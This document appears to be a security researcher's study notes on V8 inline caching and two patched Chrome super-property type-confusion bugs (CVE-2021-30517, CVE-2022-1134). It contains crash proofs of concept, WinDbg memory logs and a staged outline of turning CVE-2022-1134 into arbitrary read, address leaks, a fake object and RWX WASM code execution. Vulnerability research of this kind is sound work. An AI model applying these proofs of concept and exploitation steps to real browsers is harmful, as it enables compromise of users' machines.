### Property Access & Inline Caching

- Inline caching speeds up propety access

- Ignition Interpreter collects data for function run which is used by TurboFan to generate optimized machine code

- Object map stores many important information such as memory layout of object. If 2 objects have similar structures, they will have similar maps and hence the way their propeties are accessed will be similar enough for v8 to optimise

- Read more here on inline caching: [JavaScript engine fundamentals: Shapes and Inline Caches](https://mathiasbynens.be/notes/shapes-ics), [super inline caching](https://v8.dev/blog/fast-super), [Short and seemingly useless article on inline caching](https://javascript.plainenglish.io/v8-engine-and-inline-caching-in-javascript-fef80054a551)

- There are 2 kinds of properties: keyed and named (think of a[1] vs a.x)

- Bytecode generation for is handled by various IGNITION_HANDLERs: IGNITION_HANDLER calls LoadIC_BytecodeHandler which then generates bytecode based on feedback collected thus far. For property access bytecode generation:

    1. If the function is being called for the first time and hence has no feedback, then the bytecode generated and run will be the inefficient property access

        > In the meantime, feedback is collected and optimized property access handlers **for that particular object's map** are cached

    2. If not, the LoadIC_BytecodeHandler will try to find for cached optimized property access handler

        > If it is not found/or somehow the the propety access fails, then v8 will report cache miss and use inefficient property access 

        > If it found then use cached optimized property access handler

    3. When a cache miss occurs, LoadIC_Miss() is called 

        > Creates and caches a new optimized handler to be used when the same property access is called
        
        > LoadIC -> LoadIC::Load -> UpdateCaches -> ComputeHandler

        > ComputeHandler uses the type of property access determined by object map to determine how to create the handler

- Tl;dr, when we are inline caching to optimize property accesses, need to ensure that the assumptions made when handler is created and used remains the same for each property access

### Refresher on super()

- Extends is used to denote the parent class that the child class will inherit its methods from, and super is used to reference the parent classes constructor method as per this [article](https://dev.to/mconner89/creating-child-classes-using-super-and-extends-o0i)

- Use [w3schools](https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_class_extends) example to play around with it

- d8.exe

    ```
    d8> class B {  m() {    return super.prop;  }}B.prototype.__proto__ = {get prop() {return this.x}};var b = new B();b.x = 1;b.m()
    1
    d8> %DebugPrint(B)
    DebugPrint: 000001D74490DAB1: [Function]
    - map: 0x00b1d560c1b1 <Map(HOLEY_ELEMENTS)> [FastProperties]
    - prototype: 0x0237b55842a1 <JSFunction (sfi = 000001ACB5104DE9)>
    - elements: 0x0270b3882cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
    - function prototype: 0x01d74490db31 <B map = 000000B1D560C3E1>
    - initial_map: 0x00b1d560c391 <Map(HOLEY_ELEMENTS)>
    - shared_info: 0x0237b55a2139 <SharedFunctionInfo B>
    - name: 0x0237b55a2019 <String[1]: B>
    - formal_parameter_count: 0
    - kind: DefaultBaseConstructor
    - context: 0x0237b55a2531 <ScriptContext[5]>
    - code: 0x0208f078ca81 <Code BUILTIN InterpreterEntryTrampoline>
    - interpreted
    - bytecode: 00000237B55A2A39
    - source code:
    - properties: 0x0270b3882cf1 <FixedArray[0]> {
        #length: 0x01acb5119779 <AccessorInfo> (const accessor descriptor)
        #prototype: 0x01acb51197e9 <AccessorInfo> (const accessor descriptor)
        0x0270b3886729 <Symbol: (class_positions_symbol)>: 0x01d74490d9a1 <Tuple2 0, 42> (const data descriptor)
        #name: 0x01acb5119709 <AccessorInfo> (const accessor descriptor)
    }

    - feedback vector: 00000237B55A2A79: [FeedbackVector] in OldSpace
    - map: 0x0270b3882c91 <Map>
    - length: 0 (empty)
    000000B1D560C1B1: [Map]
    - type: JS_FUNCTION_TYPE
    - instance size: 64
    - inobject properties: 0
    - elements kind: HOLEY_ELEMENTS
    - unused property fields: 0
    - enum length: invalid
    - stable_map
    - callable
    - constructor
    - has_prototype_slot
    - prototype_map
    - prototype info: 0
    - prototype_validity cell: 0x01acb5102201 <Cell value= 1>
    - instance descriptors (own) #4: 0x01d74490db69 <DescriptorArray[14]>
    - layout descriptor: 0000000000000000
    - prototype: 0x0237b55842a1 <JSFunction (sfi = 000001ACB5104DE9)>
    - constructor: 0x0237b55844c1 <JSFunction Function (sfi = 000001ACB510F9F9)>
    - dependent code: 0x0270b3882391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    - construction counter: 0

    class B {  m() {    return super.prop;  }}
    d8> %DebugPrint(B.prototype)
    DebugPrint: 000001D74490DB31: [JS_OBJECT_TYPE]
    - map: 0x00b1d560c3e1 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
    - prototype: 0x01d74490dc39 <Object map = 000000B1D560C341>
    - elements: 0x0270b3882cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
    - properties: 0x01d74490ddb1 <NameDictionary[29]> {
    #constructor: 0x01d74490dab1 <JSFunction B (sfi = 00000237B55A2139)> (data, dict_index: 1, attrs: [W_C])
    #m: 0x01d74490daf1 <JSFunction m (sfi = 00000237B55A2191)> (data, dict_index: 2, attrs: [W_C])
    }
    000000B1D560C3E1: [Map]
    - type: JS_OBJECT_TYPE
    - instance size: 56
    - inobject properties: 4
    - elements kind: HOLEY_ELEMENTS
    - unused property fields: 0
    - enum length: invalid
    - dictionary_map
    - may_have_interesting_symbols
    - prototype_map
    - prototype info: 0x0237b55a2aa1 <PrototypeInfo>
    - prototype_validity cell: 0x0237b55a2b11 <Cell value= 0>
    - instance descriptors (own) #0: 0x0270b3882321 <DescriptorArray[2]>
    - layout descriptor: 0000000000000000
    - prototype: 0x01d74490dc39 <Object map = 000000B1D560C341>
    - constructor: 0x01d74490dab1 <JSFunction B (sfi = 00000237B55A2139)>
    - dependent code: 0x0270b3882391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    - construction counter: 0

    {constructor: class B {  m() {    return super.prop;  }}, m: m() {    return super.prop;  }}
    d8> %DebugPrint(B.prototype.__proto__)
    DebugPrint: 000001D74490DC39: [JS_OBJECT_TYPE]
    - map: 0x00b1d560c4d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
    - prototype: 0x0237b5584229 <Object map = 000000B1D56022F1>
    - elements: 0x0270b3882cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
    - properties: 0x0270b3884761 <PropertyArray[0]> {
        #prop: 0x0237b55a29a1 <AccessorPair> (const accessor descriptor)
    }
    000000B1D560C4D1: [Map]
    - type: JS_OBJECT_TYPE
    - instance size: 24
    - inobject properties: 0
    - elements kind: HOLEY_ELEMENTS
    - unused property fields: 0
    - enum length: invalid
    - stable_map
    - may_have_interesting_symbols
    - prototype_map
    - prototype info: 0x0237b55a2ad9 <PrototypeInfo>
    - prototype_validity cell: 0x01acb5102201 <Cell value= 1>
    - instance descriptors (own) #1: 0x0237b55a62a9 <DescriptorArray[5]>
    - layout descriptor: 0000000000000000
    - prototype: 0x0237b5584229 <Object map = 000000B1D56022F1>
    - constructor: 0x0237b5584261 <JSFunction Object (sfi = 000001ACB510ED51)>
    - dependent code: 0x0270b3882391 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
    - construction counter: 0

    {get prop() {return this.x}}
    ```

- Insights from `what_is_super.html`:

    ![](./JavaScript's%20super()/super_and_inheritance.png)

    - We can see how the Object's prototype will store the classes it extended from and the `__proto__` will store the parent's functions

- Important case study:

    ```
    class B {
        m() {
            return super.length;
        }
    }

    var b = new B();
    B.prototype.__proto__ = new Int8Array(1);
    b.m();  //<---- throw TypeError
    ```

    > VM618:6 Uncaught TypeError: 
    > 
    > Method get TypedArray.prototype.length called on incompatible receiver [object Object] 
    >
    > at get length (<anonymous>)
    >
    > at B.m (<anonymous>:6:18)
    >
    > at <anonymous>:15:3

    - We are able to run `B.prototype.__proto__.length` but not `B.m()` which indirectly does the same thing due to prevention of type confusion (retrieving "length" of JSObject based on the offsets and algorithm for JSArray)

    - Receiver refers to `var b = new B()`

### Super + IC = SuperIC

- When optimising property access via super, super inline caching is used

- GetNamedPropertyFromSuper -> LoadSuperIC (which is similar to LoadIC)

- Level of complication: parent property vs receiver property. Assumptions made during super property access optimization should apply to the correct object(s). The correct handler (and hence inline cache) should be used (receiver/parent)

- In chromium source code `lookup_start_object` refers to parent while `home_object` refers to receiver

- There has been previous vulnerabilities caused by confusion in using the correct object (parent/child)

### [CVE-2021-30517](https://issues.chromium.org/issues/40055688) 

- This is a type confusion bug caused by using the wrong handler and the wrong inline cache during super property access optimization

- GetNamedPropertyFromSuper -> LoadSuperIC -> HandleLoadICHandlerCase (if there is enough feedback (and hence inline cache) and the handler is found)

- Before the handler is created, we can see that we are referencing the parent's object when attempting to access the prototype via super

    ![](./Past%20SuperIC%20Bug%20-%20CVE-2021-30517/understanding_cve-2021-30517.png)

- HandleLoadICHandlerCase will eventually use the parent's handler but supply child object

- The following is a PoC code which will cause a crash when attempting to access `0x???42424241`

    ```
    function main() {
        class C {
            m() {
                super.prototype
            }
        }
        function f() {}
        C.prototype.__proto__ = f // parent is a JSFunc with a prototype

        let c = new C()           // child is a JSObject with no prototype
        c.x0 = 1
        c.x1 = 1
        c.x2 = 1
        c.x3 = 1
        c.x4 = 0x42424242 / 2

        f.prototype
        c.m()                    // calls m() which accesses super.prototype, aka the parent's prototype
        
        // expects JSFunc but got JSObject (cause we are using the child and not the parent)
    }
    for (let i = 0; i < 0x100; ++i) {
        main()
    }
    ```

- Lets look at the layout of the following objects in memory:

    ![](./Past%20SuperIC%20Bug%20-%20CVE-2021-30517/x4_overlaps_with_prototype.png)

    - We observe that the address of function.prototype is located at function_pointer + 0x1c (stored as a compressed pointer)

    - We also observe that when we add properties to classes, it is stored inline, and the 5th property we add (.x4) is stored at class_pointer + 0x1c

- The reason why we get an illegal access at `0x???42424241` is because when enough feedback is collected to create an optimised handler for super property access (which is in this context accessing the parent's prototype via `super`), we will use the parent's inline cache and optimised super handler but supply the child object instead. Instead of accessing the parent prototype at parent_pointer + 0x1c, we will access whatever is at child_pointer + 0x1c

- Note that prototypes in JavaScript classes and JavaScript functions are completely different as seen in d8.exe

    ![](./Past%20SuperIC%20Bug%20-%20CVE-2021-30517/not_all_prototypes_are_the_same.png)

### [CVE-2022-1134](https://issues.chromium.org/issues/40059162)

- Patched in [100.0.4896.60](https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_29.html) (first stable release of Chrome 100)

- GetNamedPropertyFromSuper -> LoadSuperIC -> Not enough feedback, fallback to slow implementation ->  ComputeHandler (to create a new handler to update the inline cache when appropriate)

- In order to reach the exploitable condition, we need to make sure that we are our super property access involves a getter and simple_api_call 

    - simple_api_call allows V8 to access functions defined externally (e.g. Blink). V8 also has its own set of APIs to allow other embedded application to use just like how simple_api_calls are available for V8 

    - Problem is that if we do a super property access which is in fact a getter and a simple_api_call, we would expect any checks do be done on the child object, instead the map check is done on the parent object, which obviously won't fail cause the parent object has the correct map to pass the respective checks when creating the optimised handler

        > The point here is that when we are creating the optimised handler for super property access, we can definitely create it because we bypass all the checks because the parent object and map are being checked 
 
    - The next problem is that when we are doing a super property access which is a getter property, we will be referencing child object's properties instead of the parent objects. Meaning to say, we will be using the parent's getter function with the child property values

        ```
        class B {
            m() {
                return super.prop;
            }
        }

        var b = new B();
        var a = {get prop() {return this.x}, x : 'A'};
        b.x = 'B';

        B.prototype.__proto__ = A;

        b.m() //<-------- 'B'
        ```

        > In this example, we call `m()` which does a super property access, accessing prop which is a getter and will hence run `return this.x`, but the `this.x` that it will return will be the child.x not parent.x even if there is an x in parent

    - All in all, during feedback collection and the creation of the handler, there will not be any issues because the wrong object is being used during validation. Once we are ready to use the handler, we will be trying to run a non-existent getter function on the child object.

        ```
        <pre id="log"></pre>
        <script>
            function log(_string) {
                console.log(_string)
                document.getElementById("log").innerHTML += `${_string} <br/>`
            }
            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            function main(i) {

                class B {
                    m() {
                        try {
                            return super.x; 
                        } catch(e) {
                            return e.message // catch the error before IC is used
                        }
                    }
                }

                var domRect = new DOMRect(1, 1, 1, 1);
                domRect['a' + i] = 1;
                B.prototype.__proto__ = domRect;

                let b = new B();
                
                b.x0 = 0x40404040;
                b.x1 = 0x41414141;
                b.x2 = 0x42424242;
                b.x3 = 0x43434343;
                domRect.x;

                ret = b.m(); 
                return ret
            }  
            
            async function mainmain() {
                for (let i = 0; i < 20; i++) {
                    ret = main(i);
                    await sleep(20)
                    log(`${i} - ${ret}`) 
                }

            }

            mainmain()
        </script>
        ```

    - Here is a screenshot created by our PoC:

        ![](./Rnd/type_confusion_in_memory.png)

### CVE-2022-1134 Exploitation Part 0 - Blink Addresses

- Wrote exploit using [98.0.4758.102](https://www.filepuma.com/download/google_chrome_64bit_98.0.4758.102-31301/) on Windows to challenge my ability to fully understand the exploitation process (last stable release before patch is 99.0.4844.84)

- Because we are dealing with Blink objects, we need to know how to obtain the blink addresses of the objects we created (v8 representations can be found via `%DebugPrint()`). Similar to the technique used in IE, we can search for functions to breakpoint at using the symbols obtained from chromium server

    ```
    pt ; r ; g
    bm chrome!blink::DeviceMotionEvent::DeviceMotionEvent ; bp chrome!blink::DOMRect::Create ; bp chrome!blink::DeviceMotionEvent::interval ; 
    bm chrome!*blink::DeviceMotionEvent::*
    x chrome!*blink::DOMRect::*
    x chrome!*blink::DeviceMotionEvent::*
    x chrome!*blink::DeviceMotionEvent::*Interval*
    bp chrome!blink::DOMRect::Create
    x chrome!*blink::DeviceMotionEvent::*Interval*
    bp chrome!blink::AudioData::Create
    bm chrome!blink::Request::Create -> does not return the correct one (returns pointer to chrome!blink::RequestInit::`vftable')
    bp chrome+01026d88 -> return correct one (version specific though)
    bm chrome!blink::Request::signal
    chrome.exe --no-sandbox --js-flags="--allow-natives-syntax" --enable-logging --v=1
    ```

- The following is the debug log in Windbg for finding DOMRect objects

    ```
    0:006> g
    Breakpoint 0 hit
    chrome!blink::DOMRect::Create:
    00007ff9`149bd1d0 4156            push    r14
    0:000> pt ; r ; g
    rax=00000cc400294ca0 rbx=00000067e13fd568 rcx=77427a5941490000
    rdx=0000146600056d20 rsi=000012f000000007 rdi=00000067e13fd2a0
    rip=00007ff9149bd245 rsp=00000067e13fd088 rbp=00001466001b8000
    r8=00000000000004d1  r9=00000cc400280000 r10=0000000000002888
    r11=00007ff916fdaf80 r12=00001466001a8150 r13=00000067e13fd228
    r14=00000067e13fd0c0 r15=00001466001b8000
    iopl=0         nv up ei pl nz na pe nc
    cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
    chrome!blink::DOMRect::Create+0x75:
    00007ff9`149bd245 c3              ret  3
    ```

### CVE-2022-1134 Exploitation Part 1 - Type Confusion to obtain Arbitrary Read

- Confuse a DOMMatrix object as a DeviceMotionEvent object

- Once JavaScript interprets DOMMatrix as a DeviceMotionEvent, we can run `interval` to obtain an arbitrary read primitive

- The following is the debug log in Windbg to know the offset from the DeviceMotionEvent object when accessing interval

    ```
    0:000> g
    Breakpoint 4 hit
    chrome!cppgc::internal::MemberBase::GetRaw [inlined in chrome!blink::DeviceMotionEvent::interval]:
    00007ff8`ea5c1570 488b4178        mov     rax,qword ptr [rcx+78h] ds:0000762d`00312af0=0000762d002940e8
    0:000> t
    chrome!blink::DeviceMotionData::Interval [inlined in chrome!blink::DeviceMotionEvent::interval+0x4]:
    00007ff8`ea5c1574 f20f104018      movsd   xmm0,mmword ptr [rax+18h] ds:0000762d`00294100=0000000000000000
    0:000> t
    chrome!blink::DeviceMotionEvent::interval+0x9:
    00007ff8`ea5c1579 c3              ret
    ...
    0000762d`00312a78 00007ff8eb394658 chrome!weak.??_7DeviceMotionEventblink
    0000762d`00312a80 0000423e00865900 
    0000762d`00312a88 0000423e00662f60 
    0000762d`00312a90 0000000000000080 
    0000762d`00312a98 0000000000000000 
    0000762d`00312aa0 0000000000000000 
    0000762d`00312aa8 0000000000000000 
    0000762d`00312ab0 0000000000000000 
    0000762d`00312ab8 0000000000000000 
    0000762d`00312ac0 0000000000000000 
    0000762d`00312ac8 0000000000000000 
    0000762d`00312ad0 0000000000000000 
    0000762d`00312ad8 0000000000000000 
    0000762d`00312ae0 0000000000000000 
    0000762d`00312ae8 000001f2f5b0c980 
    0000762d`00312af0 0000762d002940e8 
    0000762d`00312af8 002800c500000000 
    0000762d`00312b00 00007ff8eb13be60 chrome!blink::DOMMatrix::`vftable'
    0000762d`00312b08 0000423e00865960 
    0000762d`00312b10 0000000000004141 
    0000762d`00312b18 0000000000004141 
    0000762d`00312b20 0000000000004141 
    0000762d`00312b28 0000000000004141 
    0000762d`00312b30 0000000000004242 
    0000762d`00312b38 0000000000004242 
    0000762d`00312b40 0000000000004242 
    0000762d`00312b48 0000000000004242 
    0000762d`00312b50 0000000000004141 
    0000762d`00312b58 0000000000004141 
    0000762d`00312b60 0000000000004141 
    0000762d`00312b68 0000000000004141 
    0000762d`00312b70 0000000000004242 
    0000762d`00312b78 0000000000004242 
    0000762d`00312b80 0000000000004242 
    0000762d`00312b88 0000000000004242
    ...
    0:000> ? 0000762d`00312b00+78
    Evaluate expression: 129935648828280 = 0000762d`00312b78
    0:000> dq 0000762d`00312b78 L1
    0000762d`00312b78  00000000`00004242
    ```

    - rcx has the DeviceMotionEvent object (which we can verify in memory), so we found the location of where the interval is stored in

    - From the Windbg debug log, ww know that we will be reading whatever is `(in DOMMatrix+0x78)*` + 0x18

- What the DeviceMotionEvent and DOMMatrix object looks like in memory:

    ![](./Rnd/arbitrary_read_in_memory.png)

### CVE-2022-1134 Exploitation Part 2 - Type Confusion to obtain leak (Blink Addresses)

- Confuse an ImageData object as a DOMMatrix object

- We know that at the ImageData object has certain properties in its blink structure

- If we can type confuse ImageData as DOMMatrix, then we can leak these blink properties by accessing `.m**`

- After which, we can use our arbitrary read primative from part 1 to read up and down the leak

- Since we know that most heaps in chrome are linear, we can also position certain structures before and after our leak in order to create our fake object primitive in part 3

- Here you can see how we leak blink addresses:

    ![](./Rnd/leak_address.png)

### CVE-2022-1134 Exploitation Part 3 - Type Confusion to obtain Fake Object

- Confuse a DOMMatrix object as a Request object

- Request.signal will return a Signal object

- We can see that how it works is that when we attempting to execute Request.signal, we will find the Blink signal object at +0x38

    ![](./Rnd/finding_blink_request.png)

    ![](./Rnd/finding_blink_request_signal.png)

- If we dive deeper into the algorithm, we know that we will attempt to look at the Signal's main_world_wrapper_value which is at +0x8 from the Signal object. We will then deference and return it

- In order to obtain a fake object, we need to be able to control a type confused and faked "main_world_wrapper_value" such that it will dereference to a value that we control

- To do so, what Man Yue Mo did is that he type confused an AudioData object with a Request object and made use of the AudioData.timestamp attribute which can hold any 64bit value to obtain a fake object primitive. Since he can control the timestamp value, he set the value as the blink address of the Uint8ClampedArray TypedArray +0x8 which has the following structure:

    ![](./Rnd/fake_object_explanation.png)

    - When we attempt to look at the type confused "main_world_wrapper_value" after getting dereferenced, we will be returning whatever object that is in TypedArray+0x10 which is the backingstore of the Uint8ClampedArray

    - We can obain the blink address of the Uint8ClampedArray from part 2

- Here you can see the conversion from blink to v8 when accessing Request.signal

    ![](./Rnd/converts_blink_to_v8.png)

- In this version, you cannot use AudioData.timestamp and Request.signal cause the offset from Request to signal is +0x38 while the offset from AudioData to timestamp is +0x40

    ![](./Rnd/ver98_Request_And_AudioData_Incompatible.png)

    - But you can use DOMMatrix hehe (which is what we ended up using)

- Here we can see that after completing Signal.request, we managed to return our Uint8ClampedArray backingstore with the type confusion vulnerability

    ![](./Rnd/success_fake_object.png)

    - Of course, `%DebugPrinting` this fake object will crash the renderer as this is not a valid object

### CVE-2022-1134 Exploitation Part 4 - The sum of parts

- Create a blink leak

- Read the blink leak to get v8 addresses

- Construct a Fake Object which becomes our compressed read/compressed write (since we can control the attributes of this fake object) as well as our compressed addrOf

- Create a WASM

- Create an ArrayBuffer

- Set the backing store of the arraybuffer to the RWX of the WASM space. This version on windows does not implement the W^X protection

    ![](./Rnd/ver98_wx_protection_wasm.png)

- pwn!!!!

### References

- [Man Yue Mo's full exploit code](https://github.com/github/securitylab/blob/main/SecurityExploits/Chrome/v8/CVE_2022_1134/superic_rce.html)

- [Man Yue Mo's full writeup](https://github.blog/2022-06-29-the-chromium-super-inline-cache-type-confusion/)